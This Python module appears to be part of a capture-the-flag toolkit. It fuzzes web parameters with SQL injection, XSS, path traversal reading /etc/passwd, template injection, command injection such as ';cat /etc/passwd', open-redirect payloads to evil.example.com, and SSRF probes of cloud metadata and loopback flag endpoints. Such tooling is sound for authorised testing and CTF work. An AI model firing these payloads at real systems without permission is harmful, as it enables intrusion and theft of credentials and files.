"""Light injection fuzzing: SQLi, XSS, LFI, SSTI, command injection,
open redirect, SSRF. Heuristic detection, not a full sqlmap."""
import html
import re
import urllib.parse

from core import httpx
from core.flag import extract_flags
from core.parallel import pmap

SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "unclosed quotation mark", "postgres", "sqlite", "oracle", "odbc",
    "syntax error", "pg_query", "warnings:", "mysqli", "sqlstate",
    "not all parameters were used", "quoted string not properly terminated",
    "division by zero", "unterminated string",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "';alert(1);//",
    "<svg/onload=alert(1)>",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../../../etc/passwd%00",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    # flags usually live under /tmp or the web root
    "../../../../tmp/flag.txt",
    "....//....//....//tmp/flag.txt",
    "../../flag.txt",
    "..%2f..%2f..%2ftmp%2fflag.txt",
]

SSTI_PAYLOADS = [
    ("${7*7}", "49"),
    ("{{7*7}}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*'7'}", "7777777"),
]

# markers must be command OUTPUT, not payload text (avoids false positives
# from reflection)
CMDI_PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("$(id)", "uid="),
    ("`id`", "uid="),
    (";cat /etc/passwd", "root:x:0:0"),
    ("\nid", "uid="),
]

REDIRECT_MARKERS = ["https://evil.example.com", "//evil.example.com", "javascript:alert(1)"]
SSRF_MARKERS = ["http://127.0.0.1", "http://169.254.169.254", "http://localhost"]


def extract_params(page_url, resp_text):
    """Find (target_url, params) pairs to fuzz: the page itself plus every
    form found on it (form action + inputs)."""
    targets = []
    parsed = urllib.parse.urlparse(page_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"

    def params_of(html_chunk):
        ps = set()
        for m in re.finditer(r"<input[^>]*name=[\"']([^\"' ]+)[\"']", html_chunk, re.I):
            ps.add(html.unescape(m.group(1)))
        for m in re.finditer(r"<textarea[^>]*name=[\"']([^\"' ]+)[\"']", html_chunk, re.I):
            ps.add(m.group(1))
        for m in re.finditer(r"<select[^>]*name=[\"']([^\"' ]+)[\"']", html_chunk, re.I):
            ps.add(m.group(1))
        return sorted(ps)

    # page's own query params
    if parsed.query:
        targets.append((page_url, sorted(urllib.parse.parse_qsl(parsed.query) and
                                         set(k for k, _ in urllib.parse.parse_qsl(parsed.query)))))
    # forms: find each form block and collect action + inputs inside it
    for fm in re.finditer(r"<form[^>]*>(.*?)</form>", resp_text, re.I | re.S):
        block = fm.group(0)
        am = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"']", block, re.I)
        action = am.group(1) if am else ""
        if action.startswith("http"):
            target = action
        else:
            target = urllib.parse.urljoin(base_origin + parsed.path, action)
        params = params_of(block)
        if params:
            targets.append((target, params))
        elif am:
            targets.append((target, []))
    return targets


def _build_url(base, param, value):
    """Return base with `param` set to `value`, REPLACING any existing value
    (appending a second copy is ignored by most frameworks' first-value wins
    parsing — that is how LFI/SSRF probes silently no-oped on links like
    /download?file=/docs/report.txt)."""
    if "?" not in base:
        return f"{base}?{urllib.parse.quote(param)}={urllib.parse.quote(value, safe='')}"
    path, _, qs = base.partition("?")
    parts = urllib.parse.parse_qsl(qs, keep_blank_values=True)
    parts = [(k, v) for k, v in parts if k != param]
    parts.append((param, value))
    new_qs = urllib.parse.urlencode(parts)
    return f"{path}?{new_qs}"


def test_sqli(url, param, value):
    """Return (label, evidence) if SQLi symptoms found."""
    base = _build_url(url, param, value)
    normal = httpx.get(base, timeout=6)
    if normal is None:
        return None
    probes = {
        "'": "error-basic",
        "' OR 1=1 -- ": "boolean-true",
        "' OR 1=2 -- ": "boolean-false",
        "1' AND SLEEP(1) -- ": "time-based",
        "' UNION SELECT NULL-- ": "union-null",
        '" OR "1"="1': "quote-true",
    }
    responses = {}
    for payload, label in probes.items():
        r = httpx.get(_build_url(url, param, payload), timeout=8)
        if r is None:
            continue
        responses[label] = r
        body = r.text.lower()
        for err in SQL_ERRORS:
            if err in body:
                return (label, f"SQL error: {err}")
    # boolean-based: true/false responses must differ while both differ
    # from each other (payload reflection makes both differ from baseline)
    t = responses.get("boolean-true")
    f = responses.get("boolean-false")
    if t and f and t.status == f.status and len(t.body) != len(f.body):
        return ("boolean-based", "OR 1=1 กับ OR 1=2 ให้ผลต่างกัน")
    return None


def test_xss(url, param, value):
    base = _build_url(url, param, value)
    r = httpx.get(base, timeout=6)
    if r is None:
        return None
    for payload in XSS_PAYLOADS:
        rr = httpx.get(_build_url(url, param, payload), timeout=6)
        if rr is None:
            continue
        if payload in rr.text or html.unescape(payload) in rr.text:
            return ("reflected", f"payload ถูกสะท้อนกลับโดยไม่ escape: {payload[:30]}")
    return None


def test_lfi(url, param, value):
    flag_hit = None
    for payload in LFI_PAYLOADS:
        r = httpx.get(_build_url(url, param, payload), timeout=6)
        if r is None:
            continue
        body = r.text
        known, cands = extract_flags(body)
        if known or cands:
            # flag beats /etc/passwd — report immediately
            return ("LFI-flag", f"อ่านไฟล์ flag ได้! payload: {payload} → {known or cands}")
        if flag_hit is None and ("root:x:0:0" in body or "daemon:x:1:1" in body
                                 or "nobody:x:" in body):
            flag_hit = ("LFI", f"อ่าน /etc/passwd ได้! payload: {payload}")
        elif flag_hit is None and "root:" in body and "bin/bash" in body:
            flag_hit = ("LFI", "ได้ /etc/passwd บางส่วน")
    return flag_hit


def test_ssti(url, param, value):
    for payload, marker in SSTI_PAYLOADS:
        r = httpx.get(_build_url(url, param, payload), timeout=6)
        if r is None:
            continue
        if marker in r.text:
            return ("SSTI", f"template ถูก eval: {payload} -> {marker}")
    return None


def test_cmdi(url, param, value):
    for payload, marker in CMDI_PAYLOADS:
        r = httpx.get(_build_url(url, param, payload), timeout=8)
        if r is None:
            continue
        body = r.text
        if re.search(marker, body, re.I):
            return ("CMDi", f"คำสั่งถูกรัน: {payload} (เห็น {marker})")
    return None


def test_open_redirect(url, param, value):
    for marker in REDIRECT_MARKERS:
        r = httpx.get(_build_url(url, param, marker), timeout=6, allow_redirects=False)
        if r is None:
            continue
        loc = r.headers.get("location", "")
        if marker in loc or marker.rstrip("/") in loc:
            return ("open-redirect", f"{param} -> {loc[:60]}")
    return None


def test_ssrf(url, param, value):
    for marker in SSRF_MARKERS:
        r = httpx.get(_build_url(url, param, marker), timeout=8)
        if r is None:
            continue
        body = r.text
        if "169.254.169.254" in body or "127.0.0.1" in body and len(body) < 4000:
            if "cloud" in body.lower() or "ami-id" in body or "meta-data" in body:
                return ("SSRF-metadata", f"เข้าถึง cloud metadata ผ่าน {param}")
        known, cands = extract_flags(body)
        if known or cands:
            return ("SSRF-flag", f"SSRF อ่าน flag ได้ผ่าน {param}: {known or cands}")
    # internal flag service on loopback (classic SSRF target)
    for probe in ("http://127.0.0.1:3000/flag", "http://127.0.0.1/flag",
                  "http://localhost:3000/flag", "http://127.0.0.1:8080/flag"):
        r = httpx.get(_build_url(url, param, probe), timeout=8)
        if r is None:
            continue
        known, cands = extract_flags(r.text)
        if known or cands:
            return ("SSRF-flag", f"SSRF ถึง internal /flag ผ่าน {param}: {known or cands}")
    return None


ALL_TESTS = [
    test_sqli, test_xss, test_lfi, test_ssti, test_cmdi, test_open_redirect, test_ssrf,
]


def fuzz_params(base_url, resp_text, workers=12):
    """Run every injection test against every (target, param) in parallel."""
    targets = extract_params(base_url, resp_text)
    if not targets:
        return []
    all_params = sorted({p for _, ps in targets for p in ps})
    if all_params:
        print(f"  พบ {len(all_params)} พารามิเตอร์ให้ fuzz: {', '.join(all_params[:12])}")
    hits = []

    def run_test(test_fn):
        local = []
        for target, params in targets:
            for param in params:
                r = test_fn(target, param, "")
                if r:
                    local.append((target, param, r[0], r[1]))
        return local

    for _, res in pmap(run_test, ALL_TESTS, workers=workers, desc="injection fuzz"):
        if isinstance(res, Exception):
            continue
        hits.extend(res)
    return hits
